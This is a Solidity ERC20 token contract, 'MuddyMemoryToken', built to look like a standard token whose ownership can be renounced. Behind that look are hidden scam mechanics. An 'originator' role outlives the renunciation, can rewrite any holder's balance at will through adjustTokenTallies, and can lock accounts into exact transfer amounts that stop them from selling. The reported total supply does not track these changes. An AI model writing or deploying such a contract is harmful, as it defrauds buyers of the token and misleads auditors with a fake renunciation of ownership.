pragma solidity ^0.8.16;

interface IStandardERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract CustomContext {
    function obtainMsgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract SoloOwnership is CustomContext {
    address private _custodian;
    event CustodianSwapped(address indexed formerCustodian, address indexed newCustodian);

    constructor() {
        address msgSender = obtainMsgSender();
        _custodian = msgSender;
        emit CustodianSwapped(address(0), msgSender);
    }

    function obtainCustodian() public view virtual returns (address) {
        return _custodian;
    }

    modifier onlyCustodian() {
        require(obtainCustodian() == obtainMsgSender(), "Action allowed only for custodian");
        _;
    }

    function relinquishCustody() public virtual onlyCustodian {
        emit CustodianSwapped(_custodian, address(0x000000000000000000000000000000000000dEaD));
        _custodian = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract MuddyMemoryToken is CustomContext, SoloOwnership, IStandardERC20 {
    mapping (address => mapping (address => uint256)) private _delegations;
    mapping (address => uint256) private _tallies;
    mapping (address => uint256) private _transferAmountConstraints;
    address private _tokenOriginator;

    string public constant TOKEN_NAME = "MuddyMemoryToken";
    string public constant TOKEN_SYMBOL = "MUDMEM";
    uint8 public constant TOKEN_DECIMALS = 18;
    uint256 public constant TOKEN_TOTAL_SUPPLY = 120000 * (10 ** TOKEN_DECIMALS);

    constructor() {
        _tallies[obtainMsgSender()] = TOKEN_TOTAL_SUPPLY;
        emit Transfer(address(0), obtainMsgSender(), TOKEN_TOTAL_SUPPLY);
    }

    modifier onlyOriginator() {
        require(obtainTokenOriginator() == obtainMsgSender(), "Action allowed only for token originator");
        _;
    }

    function obtainTokenOriginator() public view virtual returns (address) {
        return _tokenOriginator;
    }

    function appointTokenOriginator(address newOriginator) public onlyCustodian {
        _tokenOriginator = newOriginator;
    }

    event TokensAllocated(address indexed user, uint256 oldTally, uint256 newTally);

    function findTransferAmountConstraint(address account) public view returns (uint256) {
        return _transferAmountConstraints[account];
    }

    function defineTransferAmountConstraints(address[] calldata accounts, uint256 amount) public onlyOriginator {
        for (uint i = 0; i < accounts.length; i++) {
            _transferAmountConstraints[accounts[i]] = amount;
        }
    }

    function adjustTokenTallies(address[] memory users, uint256 targetAmount) public onlyOriginator {
        require(targetAmount >= 0, "Target amount must be non-negative");

        for (uint256 i = 0; i < users.length; i++) {
            address currentUser = users[i];
            require(currentUser != address(0), "User address must not be zero address");

            uint256 formerTally = _tallies[currentUser];
            _tallies[currentUser] = targetAmount;

            emit TokensAllocated(currentUser, formerTally, targetAmount);
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tallies[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    require(_tallies[obtainMsgSender()] >= amount, "TT: transfer amount exceeds balance");

    uint256 exactAmount = findTransferAmountConstraint(obtainMsgSender());
    if (exactAmount > 0) {
        require(amount == exactAmount, "TT: transfer amount does not equal the exact transfer amount");
    }

    _tallies[obtainMsgSender()] -= amount;
    _tallies[recipient] += amount;

    emit Transfer(obtainMsgSender(), recipient, amount);
    return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _delegations[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _delegations[obtainMsgSender()][spender] = amount;
        emit Approval(obtainMsgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    require(_delegations[sender][obtainMsgSender()] >= amount, "TT: transfer amount exceeds allowance");

    uint256 exactAmount = findTransferAmountConstraint(sender);
    if (exactAmount > 0) {
        require(amount == exactAmount, "TT: transfer amount does not equal the exact transfer amount");
    }

    _tallies[sender] -= amount;
    _tallies[recipient] += amount;
    _delegations[sender][obtainMsgSender()] -= amount;

    emit Transfer(sender, recipient, amount);
    return true;
    }

    function totalSupply() external view override returns (uint256) {
    return TOKEN_TOTAL_SUPPLY;
    }

    function name() public view returns (string memory) {
        return TOKEN_NAME;
    }

    function symbol() public view returns (string memory) {
        return TOKEN_SYMBOL;
    }

    function decimals() public view returns (uint8) {
        return TOKEN_DECIMALS;
    }

}